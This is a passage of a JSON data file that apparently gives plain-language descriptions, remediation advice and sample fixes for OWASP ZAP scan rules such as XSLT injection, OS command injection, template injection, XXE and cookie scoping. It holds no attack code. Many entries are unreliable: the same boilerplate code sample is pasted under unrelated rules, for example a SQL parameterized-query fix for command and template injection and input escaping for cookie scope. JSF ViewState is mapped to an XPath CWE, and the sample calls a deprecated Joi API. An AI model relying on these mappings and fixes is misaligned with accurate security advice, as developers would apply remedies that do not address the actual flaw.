        "name": "CWE-917: Improper Neutralization of Special Elements Used in an Expression Language Statement",
        "url": "https://cwe.mitre.org/data/definitions/917.html"
      },
      {
        "name": "ZAP Scripting Guide",
        "url": "https://www.zaproxy.org/docs/desktop/addons/scripting/"
      },
      {
        "name": "NIST SP 800-53: AC-3 Access Enforcement",
        "url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 50001,
    "title": "Script Passive Scan Rules - Custom Script Analysis Vulnerabilities",
    "defaultRisk": "Medium",
    "cweid": 184,
    "description": "Script Passive Scan Rules vulnerabilities occur when custom ZAP passive scanning scripts contain security flaws that can lead to incomplete security analysis, false negatives, or incorrect vulnerability detection. These vulnerabilities include improper pattern matching, insufficient data validation, lack of context awareness, and poor error handling in passive analysis scripts that analyze HTTP responses for security issues.",
    "simplified_description": "Your passive security analysis scripts are like security guards who are partially blind or easily distracted. They might miss important security problems, report false alarms, or misinterpret what they're seeing, leaving your application vulnerable to attacks that should have been detected during routine security analysis.",
    "solution": "Implement robust passive scanning scripts with comprehensive pattern validation, context-aware analysis, proper error handling, and thorough testing to ensure accurate vulnerability detection without false positives or false negatives.",
    "simplified_solution": "Enhance your passive analysis scripts by implementing proper input validation for HTTP responses, using context-aware pattern matching that understands different response types, adding comprehensive error handling, testing scripts against known vulnerable and secure applications, implementing confidence scoring for findings, and regularly updating detection patterns based on new security research.",
    "references": [
      {
        "name": "OWASP Passive Security Testing",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/"
      },
      {
        "name": "CWE-184: Incomplete List of Disallowed Inputs",
        "url": "https://cwe.mitre.org/data/definitions/184.html"
      },
      {
        "name": "ZAP Passive Scripts Guide",
        "url": "https://www.zaproxy.org/docs/desktop/addons/scripting/#passive-scripts"
      },
      {
        "name": "NIST SP 800-115: Technical Guide to Information Security Testing",
        "url": "https://csrc.nist.gov/publications/detail/sp/800-115/final"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 50003,
    "title": "Stats Passive Scan Rule",
    "defaultRisk": "Low",
    "cweid": 200,
    "description": "Stats Passive Scan Rule vulnerability occurs when passive scanning statistics reveal sensitive information about application architecture, technology stack, or internal system details that could be used by attackers for reconnaissance and attack planning.",
    "simplified_description": "Your application is revealing statistics and technical information that helps attackers understand your system architecture and identify potential vulnerabilities. This information acts as a roadmap for attackers, showing them which technologies you use and how to target specific weaknesses.",
    "solution": "Implement proper information disclosure controls, sanitize statistical output, and ensure passive scanning results do not expose sensitive system information or architectural details.",
    "simplified_solution": "Configure your security scanning tools to filter out sensitive information from statistical output. Sanitize scan results to remove version numbers, server details, file paths, and internal system information. Implement proper access controls on security dashboards and ensure only authorized personnel can view detailed scan results.",
    "references": [
      {
        "name": "OWASP Information Disclosure Prevention",
        "url": "https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration/"
      },
      {
        "name": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90001,
    "title": "Insecure JSF ViewState",
    "defaultRisk": "High",
    "cweid": "643",
    "description": "Insecure JavaServer Faces (JSF) ViewState implementations can expose sensitive application state information or be vulnerable to tampering attacks, potentially leading to unauthorized access or data manipulation.",
    "simplified_description": "Your web application has a security vulnerability in how it manages user session state. This is like leaving your personal documents in an unlocked filing cabinet - attackers can view, modify, or tamper with sensitive information about user interactions and application state, potentially gaining unauthorized access to protected functionality.",
    "solution": "Implement proper ViewState encryption, MAC signing, and secure configuration to protect JSF component state from tampering and information disclosure.",
    "simplified_solution": "Configure your JSF application to use strong encryption for ViewState data, enable MAC signing to prevent tampering, set appropriate client state saving methods, and implement proper timeout mechanisms. Ensure ViewState parameters are cryptographically protected and cannot be manipulated by attackers.",
    "references": [
      {
        "name": "OWASP ViewState Security",
        "url": "https://owasp.org/www-community/vulnerabilities/JavaServer_Faces_View_State_Tampering"
      },
      {
        "name": "CWE-643: Improper Neutralization of Data within XPath Expressions",
        "url": "https://cwe.mitre.org/data/definitions/643.html"
      },
      {
        "name": "Oracle JSF Security Guide",
        "url": "https://docs.oracle.com/javaee/7/tutorial/jsf-security.htm"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90011,
    "title": "Charset Mismatch",
    "defaultRisk": "Low",
    "cweid": 200,
    "description": "The web application is serving content with a character encoding that doesn't match the declared charset, potentially leading to content encoding issues, XSS vulnerabilities, or display problems.",
    "simplified_description": "Your website says it's speaking one 'language' (charset) but actually uses another, causing confusion that attackers can exploit to trick browsers into displaying malicious content instead of harmless text.",
    "solution": "Ensure consistent character encoding declaration across HTTP headers and HTML meta tags. Use UTF-8 encoding as the universal standard throughout the application.",
    "simplified_solution": "Fix the character encoding mismatch by making your entire application use UTF-8 consistently. Configure your web server to send UTF-8 headers, add UTF-8 meta tags to HTML pages, set UTF-8 encoding in database connections, and save all files with UTF-8 encoding.",
    "references": [
      {
        "name": "W3C Character Encoding",
        "url": "https://www.w3.org/International/questions/qa-what-is-encoding"
      },
      {
        "name": "MDN Character Set Declaration",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta#charset"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90017,
    "title": "XSLT Injection",
    "defaultRisk": "High",
    "cweid": "CWE-91",
    "description": "XSLT Injection vulnerabilities occur when applications use untrusted user input to construct XSLT stylesheets or transformations without proper validation. Attackers can inject malicious XSLT code that may lead to arbitrary file reads, unauthorized network access, information disclosure, denial of service, or remote code execution through XSLT extension functions and features like document(), xsl:include, and external entity references.",
    "simplified_description": "Your application has a critical security flaw that allows attackers to inject malicious XSLT (Extensible Stylesheet Language Transformations) code into your XML processing operations. This is like giving attackers the ability to rewrite your data transformation rules - they can read sensitive files from your server, access internal network resources, steal sensitive data, cause application crashes, and potentially execute code on your system.",
    "solution": "Disable dangerous XSLT features like document(), xsl:include, external entity references, and extension functions. Use a whitelist approach for XSLT templates, validate and sanitize all user inputs used in XSLT transformations, implement secure XSLT processor configurations, use XSLT 2.0+ with secure processing mode, and apply proper input validation and output encoding.",
    "simplified_solution": "Immediately disable dangerous XSLT features in your XML processor. Use only pre-approved XSLT templates from trusted sources. Validate and sanitize all user input before using it in XML transformations. Configure your XSLT processor to block external file access and extension functions. Implement strict input validation and use secure processing modes for all XML transformations.",
    "references": [
      {
        "name": "OWASP XML External Entity Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-91: XML Injection (aka Blind XPath Injection)",
        "url": "https://cwe.mitre.org/data/definitions/91.html"
      },
      {
        "name": "XSLT Security Best Practices",
        "url": "https://www.w3.org/TR/xslt-30/#security"
      },
      {
        "name": "OWASP Top Ten A03:2021 - Injection",
        "url": "https://owasp.org/Top10/A03_2021-Injection/"
      },
      {
        "name": "MITRE ATT&CK Technique T1190 - Exploit Public-Facing Application",
        "url": "https://attack.mitre.org/techniques/T1190/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 90019,
    "title": "Server Side Code Injection",
    "defaultRisk": "Critical",
    "cweid": "94",
    "description": "Server Side Code Injection vulnerabilities allow attackers to execute arbitrary server-side code by injecting malicious input into eval() functions or similar code execution constructs.",
    "simplified_description": "Your application has an extremely dangerous security flaw that allows attackers to run their own code on your server. This is like giving strangers the keys to your office computer - they can steal all your data, take over your systems, and cause catastrophic damage to your business.",
    "solution": "Eliminate all dynamic code execution, use static code analysis, implement strict input validation, avoid eval() and similar functions, use parameterized queries for database operations.",
    "simplified_solution": "Remove all instances of eval(), exec(), system(), and similar code execution functions, validate and sanitize all user input, use secure coding practices that avoid dynamic code generation, implement proper access controls and code review processes.",
    "references": [
      {
        "name": "OWASP Code Injection",
        "url": "https://owasp.org/www-community/attacks/Code_Injection"
      },
      {
        "name": "CWE-94: Improper Control of Generation of Code ('Code Injection')",
        "url": "https://cwe.mitre.org/data/definitions/94.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 90020,
    "title": "Remote OS Command Injection",
    "defaultRisk": "Critical",
    "cweid": "78",
    "description": "Remote OS Command Injection vulnerabilities allow attackers to execute arbitrary operating system commands on the server, potentially leading to complete system compromise.",
    "simplified_description": "Your application has an extremely dangerous vulnerability that allows attackers to run their own commands on your server's operating system. This is like giving someone the administrator password to your computer - they can access all your files, steal data, install malware, and take complete control of your systems.",
    "solution": "Eliminate all system command execution, use language-specific functions instead of OS commands, implement strict input validation, use parameterized commands when absolutely necessary, and apply principle of least privilege.",
    "simplified_solution": "Remove all calls to system(), exec(), shell_exec(), and similar functions, use secure language-specific alternatives for file operations, validate and sanitize all user input, implement proper access controls, and run applications with minimal permissions.",
    "references": [
      {
        "name": "OWASP Command Injection",
        "url": "https://owasp.org/www-community/attacks/Command_Injection"
      },
      {
        "name": "CWE-78: Improper Neutralization of Special Elements used in an OS Command",
        "url": "https://cwe.mitre.org/data/definitions/78.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 90021,
    "title": "XPath Injection",
    "defaultRisk": "High",
    "cweid": "91",
    "description": "XPath Injection vulnerabilities allow attackers to inject malicious XPath queries into XML document processing, potentially leading to unauthorized data access, information disclosure, or bypassing authentication mechanisms.",
    "simplified_description": "Your application has a security flaw that allows attackers to manipulate XML database queries to access sensitive information they shouldn't see. This is like giving someone a special key that can unlock any filing cabinet - they can read private user data, bypass security controls, and extract confidential information.",
    "solution": "Use parameterized XPath queries, implement proper input validation and sanitization, use secure XML parsing libraries, and apply least privilege access to XML data.",
    "simplified_solution": "Replace dynamic XPath queries with parameterized or compiled queries, validate all user input before using it in XPath expressions, use modern XML libraries with built-in protection, implement proper error handling that doesn't reveal sensitive information.",
    "references": [
      {
        "name": "OWASP XPath Injection",
        "url": "https://owasp.org/www-community/attacks/XPath_Injection"
      },
      {
        "name": "CWE-91: XML Injection (aka Blind XPath Injection)",
        "url": "https://cwe.mitre.org/data/definitions/91.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 90022,
    "title": "Application Error Disclosure",
    "defaultRisk": "Medium",
    "cweid": 200,
    "description": "Application error disclosure vulnerabilities occur when detailed error messages, stack traces, or debugging information are exposed to end users, revealing internal application architecture, database schemas, file paths, and other sensitive information that can assist attackers in planning and executing attacks.",
    "simplified_description": "Your application is showing detailed error messages to users, like leaving your detailed diagnostic reports open on a restaurant table. Attackers can see your code structure, database queries, server paths, and system architecture that helps them understand exactly how your application works and find specific weaknesses to exploit.",
    "solution": "Implement proper error handling with user-friendly error messages, disable detailed error information in production, and log comprehensive error details server-side while providing generic error responses to users.",
    "simplified_solution": "Configure your application to show simple, generic error messages to users (like 'Something went wrong') while logging detailed error information securely on the server. Turn off debugging and stack trace display in production, implement custom error pages, and ensure sensitive configuration details are never exposed in error responses.",
    "references": [
      {
        "name": "OWASP Error Handling Guide",
        "url": "https://owasp.org/www-project-proactive-controls/v3/en/c8-errors-exceptions"
      },
      {
        "name": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90023,
    "title": "XML External Entity Attack",
    "defaultRisk": "High",
    "cweid": "611",
    "description": "XML External Entity (XXE) attacks occur when XML input containing a reference to an external entity is processed by a misconfigured XML parser, potentially leading to information disclosure, server-side request forgery, or denial of service.",
    "simplified_description": "Your application has a dangerous XML processing vulnerability that allows attackers to access files on your server or make requests to internal systems. This is like giving someone a special remote control that can access your file cabinets and make phone calls on your behalf - they can read sensitive files, scan your internal network, and potentially take over systems.",
    "solution": "Disable XML external entity processing, use secure XML parser configurations, validate XML input, implement input sanitization, and use JSON as a safer alternative when possible.",
    "simplified_solution": "Turn off all external entity processing in your XML parsers, disable DTD processing completely, use modern XML libraries with secure defaults, validate all XML input structure and content, consider using JSON instead of XML for data exchange, and implement proper input validation.",
    "references": [
      {
        "name": "OWASP XXE Prevention",
        "url": "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
      },
      {
        "name": "CWE-611: Improper Restriction of XML External Entity Reference",
        "url": "https://cwe.mitre.org/data/definitions/611.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90024,
    "title": "Generic Padding Oracle",
    "defaultRisk": "High",
    "cweid": "203",
    "description": "Padding Oracle vulnerabilities occur when an application reveals different error messages or timing behavior for valid vs. invalid padding in cryptographic operations. This allows attackers to decrypt ciphertexts without knowing the encryption key through adaptive chosen ciphertext attacks.",
    "simplified_description": "Your application has a cryptographic weakness that leaks information about whether encrypted data is correctly formatted. Attackers can exploit this to gradually decrypt sensitive information by watching how your application responds to specially crafted encrypted messages. This is like playing a game of 'hot or cold' where the application tells attackers when they're getting closer to the correct decryption.",
    "solution": "Implement constant-time error handling, use authenticated encryption (AEAD) modes, and ensure consistent response times regardless of padding validation results.",
    "simplified_solution": "Use modern authenticated encryption methods like AES-GCM that include built-in integrity protection, implement consistent error handling that doesn't reveal whether padding is valid, add random delays to prevent timing attacks, and avoid implementing custom cryptography.",
    "references": [
      {
        "name": "OWASP Padding Oracle Attack",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Padding_Oracle_Cheat_Sheet.html"
      },
      {
        "name": "CWE-203: Observable Discrepancy",
        "url": "https://cwe.mitre.org/data/definitions/203.html"
      },
      {
        "name": "Vaudenay, 2002 - Security Flaws in the Implementation of a Cryptographic Protocol",
        "url": "https://link.springer.com/chapter/10.1007/3-540-46035-7_23"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90026,
    "title": "SOAP Action Spoofing",
    "defaultRisk": "High",
    "cweid": "CWE-290",
    "description": "SOAP Action spoofing vulnerabilities allow attackers to manipulate the SOAPAction HTTP header to bypass authentication, access unauthorized web service methods, or invoke unintended operations. This occurs when web services rely solely on the SOAPAction header for routing or authorization decisions without proper validation of the actual SOAP message content, potentially leading to unauthorized data access, privilege escalation, or business logic manipulation.",
    "simplified_description": "Your web service has a security flaw that allows attackers to manipulate the SOAPAction header to trick your application into executing unauthorized operations. This is like someone changing the address on an envelope to redirect your mail - attackers can bypass security controls, access restricted functionality, modify data they shouldn't have access to, and potentially take over administrative functions by simply changing HTTP headers.",
    "solution": "Implement proper authentication and authorization for all web service endpoints, validate SOAP message content independently of SOAPAction headers, use digital signatures for message integrity, implement input validation for both headers and message bodies, use SSL/TLS for transport security, and employ comprehensive logging and monitoring of web service calls.",
    "simplified_solution": "Immediately implement proper authentication and authorization for all web service methods. Validate the actual SOAP message content instead of relying on HTTP headers. Use digital signatures to ensure message integrity. Implement strict input validation for both headers and message bodies. Use HTTPS for all communications. Set up comprehensive logging to monitor all web service access.",
    "references": [
      {
        "name": "OWASP Web Service Security Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html"
      },
      {
        "name": "CWE-290: Authentication Bypass by Spoofing",
        "url": "https://cwe.mitre.org/data/definitions/290.html"
      },
      {
        "name": "OWASP Top Ten A01:2021 - Broken Access Control",
        "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
      },
      {
        "name": "MITRE ATT&CK Technique T1550.002 - Use Alternate Authentication Material",
        "url": "https://attack.mitre.org/techniques/T1550/002/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90029,
    "title": "SOAP XML Injection",
    "defaultRisk": "High",
    "cweid": "CWE-91",
    "description": "SOAP XML Injection vulnerabilities allow attackers to inject malicious XML content into SOAP messages, potentially leading to XML bomb attacks (billion laughs attack), XML external entity (XXE) attacks, parameter tampering, business logic manipulation, and in some cases, remote code execution. This occurs when applications construct SOAP messages using untrusted user input without proper validation or XML sanitization.",
    "simplified_description": "Your web service has a security flaw that allows attackers to inject malicious XML code into your SOAP messages. This is like allowing someone to rewrite your letters before you send them - they can access sensitive files on your server, crash your application with XML bombs, bypass security controls, steal sensitive data, and potentially execute code by manipulating the XML structure of SOAP requests.",
    "solution": "Implement comprehensive XML input validation and sanitization, disable XML external entity (XXE) processing, use secure XML parsers with proper configuration, validate SOAP message structure and schemas, implement input length limits, use parameterized XML construction, and employ web application firewalls with XML injection protection rules.",
    "simplified_solution": "Immediately configure your XML processors to disable external entity processing and other dangerous features. Validate all XML input against predefined schemas. Implement strict input sanitization for all user-supplied data used in SOAP messages. Use secure XML parsing libraries with security features enabled. Set up comprehensive validation for SOAP message structure and content.",
    "references": [
      {
        "name": "OWASP XML External Entity Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-91: XML Injection (aka Blind XPath Injection)",
        "url": "https://cwe.mitre.org/data/definitions/91.html"
      },
      {
        "name": "OWASP Top Ten A03:2021 - Injection",
        "url": "https://owasp.org/Top10/A03_2021-Injection/"
      },
      {
        "name": "MITRE ATT&CK Technique T1190 - Exploit Public-Facing Application",
        "url": "https://attack.mitre.org/techniques/T1190/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 90030,
    "title": "WSDL File Detection",
    "defaultRisk": "Medium",
    "cweid": 200,
    "description": "WSDL files are publicly accessible, exposing sensitive web service information.",
    "simplified_description": "Your web application is publicly exposing technical documentation that describes how your web services work.",
    "solution": "Restrict access to WSDL files through authentication, network segmentation, or proper access controls.",
    "simplified_solution": "Restrict access to WSDL files through authentication, network segmentation, or proper access controls.",
    "references": [
      {
        "name": "OWASP Top Ten",
        "url": "https://owasp.org/www-project-top-ten/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90033,
    "title": "Loosely Scoped Cookie",
    "defaultRisk": "Medium",
    "cweid": "565",
    "description": "Loosely scoped cookie vulnerabilities occur when cookies are configured with overly broad scope settings such as wide domain paths, insecure protocols, or missing SameSite restrictions, allowing attackers to steal cookies through cross-site attacks, network interception, or malicious subdomain exploitation.",
    "simplified_description": "Your application is using cookies that are accessible to too many websites or situations, like giving out master keys that work on multiple buildings. Attackers can steal these overly permissive cookies from subdomains, insecure connections, or cross-site requests and use them to impersonate users, access sensitive data, and perform unauthorized actions.",
    "solution": "Implement strict cookie scope settings including specific domain restrictions, Secure flag for HTTPS only, HttpOnly flag, and proper SameSite attributes.",
    "simplified_solution": "Configure all cookies with the most restrictive settings possible. Set the Domain attribute to your exact domain, use the Path attribute to limit cookie scope, enable the Secure flag for HTTPS-only transmission, set HttpOnly to prevent JavaScript access, and use SameSite=Strict or SameSite=Lax to prevent cross-site attacks. Never use overly broad cookie scopes.",
    "references": [
      {
        "name": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
      },
      {
        "name": "CWE-565: Reliance on Cookies without Validation and Integrity Checking",
        "url": "https://cwe.mitre.org/data/definitions/565.html"
      },
      {
        "name": "MDN Web Docs - HTTP cookies",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90034,
    "title": "Cloud Metadata Potentially Exposed",
    "defaultRisk": "High",
    "cweid": 200,
    "description": "The application may be exposing cloud service provider metadata endpoints, allowing attackers to access sensitive cloud instance information including credentials, network configurations, and instance metadata. This can lead to privilege escalation and lateral movement within cloud environments.",
    "simplified_description": "Your application might be exposing your cloud server's internal information to attackers, like leaving your server's configuration files and passwords publicly accessible. Attackers can exploit this to steal cloud credentials, access other servers in your network, and potentially take over your entire cloud infrastructure.",
    "solution": "Restrict access to cloud metadata endpoints through proper network security groups, firewall rules, and application-level controls. Implement metadata filtering, use IAM roles instead of instance credentials, and monitor for unauthorized access attempts. Configure reverse proxies to block metadata endpoint access.",
    "simplified_solution": "Update your cloud security settings to block access to internal metadata endpoints. Configure firewalls and security groups to prevent external access to metadata URLs like 169.254.169.254. Use proper IAM roles for authentication instead of storing credentials in metadata. Monitor for any attempts to access these internal services.",
    "references": [
      {
        "name": "OWASP Serverless Top 10",
        "url": "https://owasp.org/www-project-serverless-top-10/"
      },
      {
        "name": "AWS Instance Metadata Service",
        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html"
      },
      {
        "name": "Google Cloud Metadata Server",
        "url": "https://cloud.google.com/compute/docs/metadata/overview"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 90035,
    "title": "Server Side Template Injection",
    "defaultRisk": "High",
    "cweid": "94",
    "description": "Server Side Template Injection vulnerabilities occur when user input is unsafely incorporated into server-side templates, allowing attackers to inject template code that can lead to remote code execution, information disclosure, or system compromise.",
    "simplified_description": "Your application has a dangerous vulnerability that allows attackers to inject malicious template code that runs on your server. This is like letting someone write their own instructions into your official documents - they can execute commands, access files, and potentially take complete control of your server.",
    "solution": "Use secure template engines with sandboxing, implement strict input validation and sanitization, avoid concatenating user input into templates, use template parameters instead of direct injection, and keep template engines updated.",
    "simplified_solution": "Never put user input directly into template code, use template engines with built-in security features and sandboxing, validate all input before using it in templates, keep template libraries updated, and use safe template practices like parameter passing instead of string concatenation.",
    "references": [
      {
        "name": "OWASP Template Injection",
        "url": "https://owasp.org/www-community/attacks/Server_Side_Template_Injection"
      },
      {
        "name": "CWE-94: Improper Control of Generation of Code ('Code Injection')",
        "url": "https://cwe.mitre.org/data/definitions/94.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 90036,
    "title": "Server Side Template Injection (Blind)",
    "defaultRisk": "High",
    "cweid": "94",
    "description": "Blind Server Side Template Injection vulnerabilities occur when template injection exists but doesn't produce immediate visible output, requiring attackers to use out-of-band techniques or time delays to detect and exploit the vulnerability.",
    "simplified_description": "Your application has a hidden security vulnerability that allows attackers to inject malicious template code that runs silently on your server. This is like having a secret backdoor that attackers can use to execute commands or access information without anyone noticing - they can exfiltrate data slowly over time or wait for the right moment to attack.",
    "solution": "Implement comprehensive input validation, use secure template configurations, monitor for suspicious template behavior, implement rate limiting and anomaly detection, and regularly audit template usage.",
    "simplified_solution": "Validate all input before using it in templates, monitor template processing for unusual patterns or excessive processing time, implement security controls that detect out-of-band attacks, keep template engines updated with security patches, and use secure template development practices.",
    "references": [
      {
        "name": "Blind SSTI Detection",
        "url": "https://portswigger.net/research/server-side-template-injection"
      },
      {
        "name": "CWE-94: Improper Control of Generation of Code ('Code Injection')",
        "url": "https://cwe.mitre.org/data/definitions/94.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  }
]